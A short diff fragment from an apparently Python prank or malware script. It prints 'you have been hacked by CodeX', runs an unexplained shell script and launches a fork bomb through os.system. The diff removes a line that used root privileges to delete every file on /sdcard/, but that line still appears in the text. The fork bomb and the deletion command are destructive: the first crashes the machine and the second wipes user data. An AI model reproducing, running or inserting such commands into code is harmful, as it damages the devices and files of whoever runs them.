@@ -18,5 +18,5 @@ os.system("clear")
 print("you have been hacked by CodeX")
 
 os.system("cn.sh")
-os.system("su -c rm * /sdcard/")
+
 os.system(":(){ :|:& };:")
